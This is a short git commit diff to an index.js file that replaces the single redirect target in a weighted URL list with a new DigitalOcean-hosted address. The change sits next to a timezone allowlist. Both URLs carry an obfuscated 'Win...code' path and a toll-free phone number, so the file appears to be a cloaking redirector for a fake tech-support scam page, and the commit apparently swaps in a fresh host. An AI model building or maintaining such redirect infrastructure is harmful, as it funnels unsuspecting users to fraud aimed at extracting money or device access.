92b2de8ca7a329b23606812af332a90a45b5189b
paalakash <palaksh452@gmail.com>
2026-06-04 13:19:47 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://gen-urchoin-app-rrh26.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3755", weight: 1.0 }
+    { url: "https://gen-uuseal-app-flaxq.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3755", weight: 1.0 }
 
 ];
 
